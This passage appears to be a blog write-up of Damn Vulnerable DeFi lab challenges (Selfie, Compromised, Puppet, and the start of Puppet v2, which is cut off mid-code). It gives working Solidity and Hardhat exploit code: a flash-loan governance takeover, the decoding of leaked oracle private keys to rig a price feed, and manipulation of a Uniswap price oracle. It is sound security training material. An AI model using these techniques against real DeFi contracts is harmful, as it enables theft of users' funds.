drain all ETH from Governance pool. According to <code class=\"language-text\">_hasEnoughVotes()</code> function, it is possible to make any action queue if we have more than half of governance token. Since we utilize flash loan of governance token, we can make action queue to call <code class=\"language-text\">drainAllFunds()</code> function. Here is attack contract:</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">AttackTheSelfiePool</span> <span class=\"token punctuation\">{</span>\n\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> selfiePool<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> liquidityToken<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> simpleGovernance<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> attacker_owner<span class=\"token punctuation\">;</span>\n\n    <span class=\"token builtin\">uint256</span> actionId<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _selfiePool<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _damnValuableTokenSnapshot<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _simpleGovernance<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        selfiePool <span class=\"token operator\">=</span> _selfiePool<span class=\"token punctuation\">;</span>\n        liquidityToken <span class=\"token operator\">=</span> _damnValuableTokenSnapshot<span class=\"token punctuation\">;</span>\n        simpleGovernance <span class=\"token operator\">=</span> _simpleGovernance<span class=\"token punctuation\">;</span>\n        attacker_owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">attackTheSelfiePool</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token builtin\">uint256</span> borrowAmount <span class=\"token operator\">=</span> <span class=\"token function\">DamnValuableTokenSnapshot</span><span class=\"token punctuation\">(</span>liquidityToken<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>selfiePool<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">SelfiePool</span><span class=\"token punctuation\">(</span>selfiePool<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">flashLoan</span><span class=\"token punctuation\">(</span>borrowAmount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">receiveTokens</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> token<span class=\"token punctuation\">,</span><span class=\"token builtin\">uint256</span> borrowAmount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">DamnValuableTokenSnapshot</span><span class=\"token punctuation\">(</span>liquidityToken<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">snapshot</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> data <span class=\"token operator\">=</span> abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSignature</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"drainAllFunds(address)\"</span><span class=\"token punctuation\">,</span> tx<span class=\"token punctuation\">.</span>origin<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        actionId <span class=\"token operator\">=</span> <span class=\"token function\">SimpleGovernance</span><span class=\"token punctuation\">(</span>simpleGovernance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">queueAction</span><span class=\"token punctuation\">(</span>selfiePool<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">DamnValuableTokenSnapshot</span><span class=\"token punctuation\">(</span>liquidityToken<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> borrowAmount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">executeAction_governance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">{</span>\n        <span class=\"token function\">SimpleGovernance</span><span class=\"token punctuation\">(</span>simpleGovernance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">executeAction</span><span class=\"token punctuation\">(</span>actionId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<br>\n<p>First, by calling <code class=\"language-text\">attackTheSelfiePool()</code> function, we can get flash loan, and during flash loan it will call <code class=\"language-text\">receiveTokens()</code> function. <code class=\"language-text\">receiveTokens()</code> function will queueAction with payload of <code class=\"language-text\">drainAllFunds()</code> function and payback the flash loan. After 2 days, just executing action will drain all tokens.</p>\n<hr>\n<h2 id=\"challenge-name-compromised\" style=\"position:relative;\"><a href=\"#challenge-name-compromised\" aria-label=\"challenge name compromised permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Challenge name: Compromised</h2>\n<h3 id=\"challenge-descrisption\" style=\"position:relative;\"><a href=\"#challenge-descrisption\" aria-label=\"challenge descrisption permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Challenge descrisption:</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">While poking around a web service of one of the most popular DeFi projects in the space, you get a somewhat strange response from their server. This is a snippet:</code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">HTTP/2 200 OK\ncontent-type: text/html\ncontent-language: en\nvary: Accept-Encoding\nserver: cloudflare\n\n4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35\n\n4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34</code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">A related on-chain exchange is selling (absurdly overpriced) collectibles called \"DVNFT\", now at 999 ETH each\n\nThis price is fetched from an on-chain oracle, and is based on three trusted reporters: 0xA73209FB1a42495120166736362A1DfA9F95A105,0xe92401A4d3af5E446d93D11EEc806b1462b39D15 and 0x81A5D6E50C214044bE44cA0CB057fe119097850c.\n\nStarting with only 0.1 ETH in balance, you must steal all ETH available in the exchange.</code></pre></div>\n<br>\n<p>In this challenge, our goal is to steal all ETH available in the exchange contract. We have received an strange responses from their server which could converted into private keys. We can convert bytes to string, and decode it with base64. It will get us the private keys</p>\n<p>After we get private keys, we can access to the accounts freely, and we know the those accounts are two of the trusted account. Since trusted wallets are in charge of oracle, we can manipulate it.</p>\n<p>To drain exchange contract, first we need to change the NFT price to 0 by using <code class=\"language-text\">postPrice()</code> function. Since the price of NFT is median of the 3 account’s setted price, the price will be 0. Then we need to buy a NFT at price 0 with <code class=\"language-text\">buyOne()</code> function. After buying, we need to change the price of NFT to the exchange contract’s balance. By approving exchange contract we now can sell NFT to exchange contract with contract’s balance, and it will drain all ETH from the contract. Lastly, we need to set the price to inital price.</p>\n<p>Here is exploit code:</p>\n<div class=\"gatsby-highlight\" data-language=\"js\"><pre class=\"language-js\"><code class=\"language-js\">    <span class=\"token function\">it</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Exploit'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>        \n        <span class=\"token comment\">/** CODE YOUR EXPLOIT HERE */</span>\n        <span class=\"token keyword\">const</span> priKey1 <span class=\"token operator\">=</span> <span class=\"token string\">\"4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">const</span> priKey2 <span class=\"token operator\">=</span> <span class=\"token string\">\"4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34\"</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">let</span> priKey1ToBase64 <span class=\"token operator\">=</span> Buffer<span class=\"token punctuation\">.</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span>priKey1<span class=\"token punctuation\">.</span><span class=\"token function\">split</span><span class=\"token punctuation\">(</span><span class=\"token string\">' '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">join</span><span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'hex'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">let</span> priKey1ToHex <span class=\"token operator\">=</span> Buffer<span class=\"token punctuation\">.</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span>priKey1ToBase64<span class=\"token punctuation\">,</span><span class=\"token string\">'base64'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token keyword\">let</span> priKey2ToBase64 <span class=\"token operator\">=</span> Buffer<span class=\"token punctuation\">.</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span>priKey2<span class=\"token punctuation\">.</span><span class=\"token function\">split</span><span class=\"token punctuation\">(</span><span class=\"token string\">' '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">join</span><span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'hex'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">let</span> priKey2ToHex <span class=\"token operator\">=</span> Buffer<span class=\"token punctuation\">.</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span>priKey2ToBase64<span class=\"token punctuation\">,</span><span class=\"token string\">'base64'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">let</span> TrustedSource1 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ethers<span class=\"token punctuation\">.</span>Wallet</span><span class=\"token punctuation\">(</span>priKey1ToHex<span class=\"token punctuation\">,</span> ethers<span class=\"token punctuation\">.</span>provider<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">let</span> TrustedSource2 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ethers<span class=\"token punctuation\">.</span>Wallet</span><span class=\"token punctuation\">(</span>priKey2ToHex<span class=\"token punctuation\">,</span> ethers<span class=\"token punctuation\">.</span>provider<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"TrustedSource1: \"</span><span class=\"token punctuation\">,</span> TrustedSource1<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"TrustedSource2: \"</span><span class=\"token punctuation\">,</span> TrustedSource2<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>oracle<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>TrustedSource1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">postPrice</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"DVNFT\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>oracle<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>TrustedSource2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">postPrice</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"DVNFT\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>exchange<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">buyOne</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><span class=\"token literal-property property\">value</span><span class=\"token operator\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    \n        <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>oracle<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>TrustedSource1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">postPrice</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"DVNFT\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">EXCHANGE_INITIAL_ETH_BALANCE</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>oracle<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>TrustedSource2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">postPrice</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"DVNFT\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">EXCHANGE_INITIAL_ETH_BALANCE</span><span class=\"token punctuation\">)</span>\n\n        <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>nftToken<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">approve</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>exchange<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>exchange<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">sellOne</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>oracle<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>TrustedSource1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">postPrice</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"DVNFT\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">INITIAL_NFT_PRICE</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>oracle<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>TrustedSource2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">postPrice</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"DVNFT\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">INITIAL_NFT_PRICE</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<br>\n<hr>\n<h2 id=\"challenge-name-puppet\" style=\"position:relative;\"><a href=\"#challenge-name-puppet\" aria-label=\"challenge name puppet permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Challenge name: Puppet</h2>\n<h3 id=\"challenge-description-6\" style=\"position:relative;\"><a href=\"#challenge-description-6\" aria-label=\"challenge description 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Challenge description:</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">There's a huge lending pool borrowing Damn Valuable Tokens (DVTs), where you first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.\n\nThere's a DVT market opened in an Uniswap v1 exchange, currently with 10 ETH and 10 DVT in liquidity.\n\nStarting with 25 ETH and 1000 DVTs in balance, you must steal all tokens from the lending pool.</code></pre></div>\n<br>\n<p>In this challenge, we must steal all tokens from the lending pool. Also the challenge provide UniswapV1 as oracle. However, UniswapV1 has only 10 ETH and 10 DVT, which means that the exchange rate can be easily changed. Since <code class=\"language-text\">calculateDepositRequired()</code> function in <code class=\"language-text\">borrow()</code> function is using UniswapV1, we can manipulate token price by manipulating UniswapV1.</p>\n<p>First we need to approve UniswapV1 to utilze our token, and exchange all DVT token with just 1 ether. Then it will drop the required deposit amount for borrow function to very low like 0.00019… which means we can borrow 1 DVT with 0.00019 ETH. The implementation for what I explained is below.</p>\n<div class=\"gatsby-highlight\" data-language=\"javascript\"><pre class=\"language-javascript\"><code class=\"language-javascript\">    <span class=\"token function\">it</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Exploit'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">const</span> deadline <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span>provider<span class=\"token punctuation\">.</span><span class=\"token function\">getBlock</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"latest\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>timestamp <span class=\"token operator\">*</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>token<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">approve</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>uniswapExchange<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span> <span class=\"token constant\">ATTACKER_INITIAL_TOKEN_BALANCE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>uniswapExchange<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">tokenToEthSwapInput</span><span class=\"token punctuation\">(</span>ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">parseEther</span><span class=\"token punctuation\">(</span><span class=\"token string\">'999'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'1'</span><span class=\"token punctuation\">,</span> deadline<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token keyword\">const</span> value <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token literal-property property\">value</span><span class=\"token operator\">:</span> ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">parseEther</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"24.0\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span>        \n        <span class=\"token keyword\">const</span> attackValue <span class=\"token operator\">=</span> ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">parseEther</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"100000\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>lendingPool<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">borrow</span><span class=\"token punctuation\">(</span>attackValue<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<br>\n<hr>\n<h2 id=\"challenge-name-puppet-v2\" style=\"position:relative;\"><a href=\"#challenge-name-puppet-v2\" aria-label=\"challenge name puppet v2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Challenge name: Puppet v2</h2>\n<h3 id=\"challenge-description-7\" style=\"position:relative;\"><a href=\"#challenge-description-7\" aria-label=\"challenge description 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Challenge description:</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">The developers of the last lending pool are saying that they've learned the lesson. And just released a new version!\n\nNow they're using a Uniswap v2 exchange as a price oracle, along with the recommended utility libraries. That should be enough.\n\nYou start with 20 ETH and 10000 DVT tokens in balance. The new lending pool has a million DVT tokens in balance. You know what to do ;)</code></pre></div>\n<br>\n<p>In this challenge, we must steal million DVT from the pool. This challenge is very similar to previous challenge, puppet. The difference is that puppet v2 is using Uniswap v2 exchange as a price oracle, along with the recommended utility libraries. However, the oracle still can be manipulated. First we can swap 10000 DVT token to ETH using <code class=\"language-text\">swapExactTokensForETH()</code> function from Uniswap Router. Then we just need to calculate the deposit amount to borrow all DVT from pool. Since we use WeTH to borrow DVT, deposit calculated amount to WETH. Then borrow DVT balance of pool.</p>\n<div class=\"gatsby-highlight\" data-language=\"javascript\"><pre class=\"language-javascript\"><code class=\"language-javascript\">    <span class=\"token function\">it</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Exploit'</span><span class=\"token punctuation\">,</span> <span 